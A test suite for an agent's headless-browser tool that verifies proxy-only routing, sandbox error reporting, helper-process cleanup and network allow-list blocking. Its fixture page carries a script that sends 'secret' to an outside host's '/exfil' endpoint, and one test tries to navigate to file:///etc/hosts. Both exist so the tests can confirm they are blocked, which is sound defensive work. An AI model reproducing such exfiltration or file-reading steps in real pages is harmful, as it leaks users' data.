/**
 * The `browser` tool against a real headless Chromium (skipped when none is installed; the release
 * workflow runs docker/fingers/browser-smoke.mjs inside the image). Two local servers: `site` is in the
 * network allow list, `outside` is not and must never see a request.
 */
import { chmodSync, existsSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { createServer, type Server } from "node:http";
import type { AddressInfo } from "node:net";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { BrowserSession, browserArguments, findBrowserExecutable } from "../src/core/browser/browser-session.ts";
import { createBrowserToolDefinition } from "../src/extensions/browser/index.ts";

const executable = findBrowserExecutable();

interface Site {
	server: Server;
	port: number;
	hits: string[];
}

async function serve(handler: (url: URL, port: number) => { type: string; body: string }): Promise<Site> {
	const hits: string[] = [];
	let port = 0;
	const server = createServer((req, res) => {
		hits.push(`${req.method} ${req.url}`);
		const { type, body } = handler(new URL(req.url ?? "/", "http://local"), port);
		res.writeHead(200, { "content-type": type }).end(body);
	});
	server.on("upgrade", (req, socket) => {
		hits.push(`UPGRADE ${req.url}`);
		socket.destroy();
	});
	await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
	port = (server.address() as AddressInfo).port;
	return { server, port, hits };
}

describe("browser arguments", () => {
	it("send every request through the proxy and resolve no host in the browser", () => {
		const args = browserArguments({
			userDataDir: "/tmp/p",
			proxyUrl: "http://127.0.0.1:4567",
			noSandbox: false,
			platform: "linux",
		});
		expect(args).toContain("--proxy-server=http://127.0.0.1:4567");
		expect(args).toContain("--proxy-bypass-list=<-loopback>");
		expect(args).toContain("--host-resolver-rules=MAP * ~NOTFOUND , EXCLUDE 127.0.0.1");
		expect(args).toContain("--force-webrtc-ip-handling-policy=disable_non_proxied_udp");
		expect(args).toContain("--disable-quic");
		expect(args).toContain("--remote-debugging-pipe");
		expect(args.some((arg) => arg.startsWith("--remote-debugging-port"))).toBe(false);
		expect(args).not.toContain("--no-sandbox");
		expect(browserArguments({ userDataDir: "/tmp/p", proxyUrl: "http://127.0.0.1:1", noSandbox: true })).toContain(
			"--no-sandbox",
		);
	});

	it("finds the browser only at FINGERS_BROWSER_PATH or fixed install locations, never on PATH", () => {
		const seen: string[] = [];
		const exists = (path: string) => {
			seen.push(path);
			return false;
		};
		expect(findBrowserExecutable({ PATH: "/workspace/node_modules/.bin" }, "linux", exists)).toBeUndefined();
		expect(
			seen.every((path) => path.startsWith("/usr/") || path.startsWith("/snap/") || path.startsWith("/opt/")),
		).toBe(true);
		expect(
			findBrowserExecutable({ FINGERS_BROWSER_PATH: "/x/chrome" }, "linux", (path) => path === "/x/chrome"),
		).toBe("/x/chrome");
		expect(findBrowserExecutable({ FINGERS_BROWSER_PATH: "/missing" }, "linux", () => false)).toBeUndefined();
	});
});

describe.skipIf(process.platform === "win32")("a browser that dies at start", () => {
	it("names the browser's own fatal error, not the crash dump printed after it", async () => {
		// What Chrome prints when Linux gives it no sandbox (e.g. Ubuntu 24.04 restricting user
		// namespaces): one FATAL line, then a long stack trace and register dump, then SIGABRT.
		const dir = mkdtempSync(join(tmpdir(), "fingers-dying-browser-"));
		const fake = join(dir, "chrome");
		const dump = Array.from(
			{ length: 80 },
			(_, i) => `#${i} 0x5581${String(i).padStart(8, "0")} (/opt/google/chrome/chrome+0x${i}abc)`,
		).join("\n");
		writeFileSync(
			fake,
			`#!/bin/sh
cat >&2 <<'EOF'
[4242:4242:1121/084454.123456:ERROR:ozone_platform_x11.cc(244)] Missing X server or $DISPLAY
[4242:4242:1121/084454.123789:FATAL:zygote_host_impl_linux.cc(128)] No usable sandbox! You are probably running on Ubuntu 23.10+ or another Linux distro that has disabled unprivileged user namespaces with AppArmor.
${dump}
  r8: 0000000000000000  r9: 00007ffd6f1f5a30 r10: 0000000000000008 r11: 0000000000000246
  ip: 00007360d8cae0cc efl: 0000000000000246 cgf: 002b000000000033 erf: 0000000000000000
  trp: 0000000000000000 msk: 0000000000000000 cr2: 0000000000000000
[end of stack trace]
EOF
kill -ABRT $$
`,
		);
		chmodSync(fake, 0o755);
		const logs: Array<{ msg: string; fields?: Record<string, unknown> }> = [];
		const session = new BrowserSession({
			env: { FINGERS_BROWSER_PATH: fake },
			log: (_level, msg, fields) => logs.push({ msg, fields }),
		});
		try {
			const error = await session.start().then(
				() => undefined,
				(failure: Error) => failure,
			);
			expect(error?.message).toMatch(/^The browser did not start: /);
			expect(error?.message).toContain("No usable sandbox!");
			expect(error?.message).not.toContain("end of stack trace");
			expect(error?.message).not.toContain("efl:");
			expect(session.running).toBe(false);
			expect(logs.some((entry) => entry.msg === "browser started")).toBe(false);
		} finally {
			await session.close();
			rmSync(dir, { recursive: true, force: true });
		}
	}, 30_000);

	/**
	 * A fake browser that leaves a helper behind, as Chrome's zygote, renderer and GPU processes can
	 * outlive the browser process: the helper keeps writing files into the profile until it is killed
	 * (or for 8 s at most), and the browser itself aborts. `outsideGroup` puts the helper in its own session,
	 * out of the browser's process group, for 3 s.
	 */
	async function startBrowserLeavingAHelper(outsideGroup: boolean) {
		const dir = mkdtempSync(join(tmpdir(), "fingers-dying-browser-"));
		const fake = join(dir, "chrome");
		const perl = [
			outsideGroup ? "use POSIX; POSIX::setsid();" : "",
			`my ($d) = @ARGV; my $end = time + ${outsideGroup ? 3 : 8}; my $i = 0;`,
			'while (time < $end) { open(my $f, ">", "$d/Cache/f" . $i++) or do { mkdir $d; mkdir "$d/Cache" };',
			"select(undef, undef, undef, 0.001); }",
		].join(" ");
		const helper = `perl -e '${perl}' "$profile"`;
		writeFileSync(
			fake,
			`#!/bin/sh
here=$(dirname "$0")
for arg in "$@"; do case "$arg" in --user-data-dir=*) profile="\${arg#--user-data-dir=}" ;; esac; done
mkdir -p "$profile/Cache"
echo "$profile" > "$here/profile.path"
${helper} </dev/null >/dev/null 2>&1 3>&- 4>&- &
echo $! > "$here/helper.pid"
sleep 0.3
echo "[1:1:1121/000000.000000:FATAL:zygote_host_impl_linux.cc(128)] No usable sandbox!" >&2
kill -ABRT $$
`,
		);
		chmodSync(fake, 0o755);
		const session = new BrowserSession({ env: { FINGERS_BROWSER_PATH: fake } });
		let maxGap = 0;
		let last = Date.now();
		const ticker = setInterval(() => {
			const now = Date.now();
			maxGap = Math.max(maxGap, now - last);
			last = now;
		}, 20);
		const error = await session.start().then(
			() => undefined,
			(failure: Error) => failure,
		);
		clearInterval(ticker);
		maxGap = Math.max(maxGap, Date.now() - last);
		const helperPid = Number(readFileSync(join(dir, "helper.pid"), "utf8"));
		const alive = () => {
			try {
				process.kill(helperPid, 0);
				return true;
			} catch {
				return false;
			}
		};
		const profile = readFileSync(join(dir, "profile.path"), "utf8").trim();
		const cleanup = async () => {
			if (alive()) process.kill(helperPid, "SIGKILL");
			await session.close();
			rmSync(profile, { recursive: true, force: true, maxRetries: 5, retryDelay: 50 });
			rmSync(dir, { recursive: true, force: true });
		};
		return { error, maxGap, alive, profile, cleanup };
	}

	it("stops the browser's helper processes with it and removes the profile", async () => {
		const run = await startBrowserLeavingAHelper(false);
		try {
			expect(run.error?.message).toContain("No usable sandbox!");
			expect(run.alive()).toBe(false);
			expect(existsSync(run.profile)).toBe(false);
			expect(run.maxGap).toBeLessThan(1_000);
		} finally {
			await run.cleanup();
		}
	}, 30_000);

	it("never stalls the event loop on a profile something outside the browser keeps writing", async () => {
		const run = await startBrowserLeavingAHelper(true);
		try {
			expect(run.error?.message).toContain("No usable sandbox!");
			// The helper is out of reach of close(), so removing the profile is retried while it writes.
			expect(run.maxGap).toBeLessThan(1_000);
		} finally {
			await run.cleanup();
		}
	}, 30_000);
});

describe.skipIf(!executable)("browser tool with a real browser", () => {
	let site: Site;
	let outside: Site;
	let session: BrowserSession;
	let tool: ReturnType<typeof createBrowserToolDefinition>;
	const logs: Array<{ level: string; msg: string; fields?: Record<string, unknown> }> = [];

	const call = (params: Record<string, unknown>) =>
		tool.execute("call", params as never, undefined, undefined, {} as never);
	const textOf = (res: Awaited<ReturnType<typeof call>>) =>
		res.content.map((part) => (part.type === "text" ? part.text : `[${part.type}]`)).join("\n");

	beforeAll(async () => {
		outside = await serve(() => ({ type: "text/plain", body: "OUTSIDE CONTENT" }));
		site = await serve((url) => {
			if (url.pathname === "/search") {
				return {
					type: "text/html",
					body: `<title>Results</title><p>You searched for ${url.searchParams.get("q")}</p>`,
				};
			}
			return {
				type: "text/html",
				body: `<!doctype html><title>Fingers test page</title>
<h1>Hello from the allowed site</h1>
<a href="/search?q=link">a link</a>
<img src="http://127.0.0.1:${outside.port}/pixel.png">
<form action="/search" method="get"><input name="q" id="q"><button id="go">Go</button></form>
<script>
fetch("http://127.0.0.1:${outside.port}/exfil?d=secret").catch(() => {});
try { new WebSocket("ws://127.0.0.1:${outside.port}/socket"); } catch (e) {}
</script>`,
			};
		});
		session = new BrowserSession({
			network: { mode: "allow_list", hosts: [`127.0.0.1:${site.port}`] },
			log: (level, msg, fields) => logs.push({ level, msg, fields }),
		});
		tool = createBrowserToolDefinition(session);
	}, 60_000);

	afterAll(async () => {
		await session?.close();
		await new Promise<void>((resolve) => site?.server.close(() => resolve()));
		await new Promise<void>((resolve) => outside?.server.close(() => resolve()));
	});

	it("opens an allowed page and blocks every request to a host outside the allow list", async () => {
		const opened = await call({ action: "navigate", url: `http://127.0.0.1:${site.port}/` });
		expect(textOf(opened)).toContain("Title: Fingers test page");
		// Give the page's fetch and WebSocket a moment; none may reach the outside server.
		await new Promise((resolve) => setTimeout(resolve, 1_000));
		const page = await call({ action: "text" });
		expect(textOf(page)).toContain("Hello from the allowed site");
		expect(textOf(page)).toContain(`a link: http://127.0.0.1:${site.port}/search?q=link`);
		expect(outside.hits).toEqual([]);
		expect(textOf(opened)).toContain(`127.0.0.1:${outside.port} (not in the run's network allow list)`);
		expect(opened.details.blocked?.length).toBeGreaterThan(0);
	});

	it("a navigation to a blocked host fails without reaching it", async () => {
		const res = await call({ action: "navigate", url: `http://127.0.0.1:${outside.port}/direct` });
		expect(textOf(res)).toMatch(/Could not open/);
		expect(textOf(res)).toContain(`127.0.0.1:${outside.port}`);
		expect(outside.hits).toEqual([]);
		// This test starts the browser; a cold first start may take up to the session's start timeout.
	}, 120_000);

	it("an https navigation outside the allow list fails as blocked, and only the page's requests are listed", async () => {
		const res = await call({ action: "navigate", url: "https://blocked.example.org/" });
		expect(textOf(res)).toContain("Could not open https://blocked.example.org/: blocked by the run's network policy");
		const listed = res.details.blocked?.map((entry) => `${entry.host}:${entry.port}`) ?? [];
		expect(listed).toContain("blocked.example.org:443");
		// The browser's own background requests (blocked too) are not attributed to the page.
		expect(listed.every((target) => target === "blocked.example.org:443" || target.startsWith("127.0.0.1:"))).toBe(
			true,
		);
		// The page still answers after the error page replaced it.
		expect(textOf(await call({ action: "screenshot" }))).toContain("Screenshot of");
	});

	it("refuses non-http URLs and never shows a file: page", async () => {
		await expect(call({ action: "navigate", url: "file:///etc/hosts" })).rejects.toThrow(/http and https/);
		await call({ action: "navigate", url: `http://127.0.0.1:${site.port}/` });
		await call({ action: "evaluate", expression: 'location.href = "file:///etc/hosts"; 1' }).catch(() => {});
		await new Promise((resolve) => setTimeout(resolve, 500));
		const after = await call({ action: "text" }).then(textOf, (error: Error) => error.message);
		expect(after).not.toMatch(/localhost/);
	});

	it("types into a form, submits it and reads the result page", async () => {
		await call({ action: "navigate", url: `http://127.0.0.1:${site.port}/` });
		const typed = await call({ action: "type", selector: "#q", text: "fingers", submit: true });
		expect(textOf(typed)).toContain(`Now at: http://127.0.0.1:${site.port}/search?q=fingers`);
		expect(textOf(await call({ action: "text" }))).toContain("You searched for fingers");
	});

	it("evaluates in the page, clicks, and takes a screenshot", async () => {
		await call({ action: "navigate", url: `http://127.0.0.1:${site.port}/` });
		expect(
			textOf(await call({ action: "evaluate", expression: "document.querySelector('h1').textContent" })),
		).toContain('"Hello from the allowed site"');
		const clicked = await call({ action: "click", selector: "a" });
		expect(textOf(clicked)).toContain("/search?q=link");
		const shot = await call({ action: "screenshot" });
		expect(shot.content[0]).toMatchObject({ type: "image", mimeType: "image/png" });
		expect(
			Buffer.from((shot.content[0] as { data: string }).data, "base64")
				.subarray(1, 4)
				.toString(),
		).toBe("PNG");
		await expect(call({ action: "click", selector: "#missing" })).rejects.toThrow(/No element/);
	});

	it("logs origins only and closes the browser", async () => {
		const text = JSON.stringify(logs);
		expect(text).toContain('"msg":"browser started"');
		expect(text).not.toContain("/search?q=");
		expect(text).not.toContain("exfil");
		await call({ action: "close" });
		expect(session.running).toBe(false);
		expect(outside.hits).toEqual([]);
	});
});
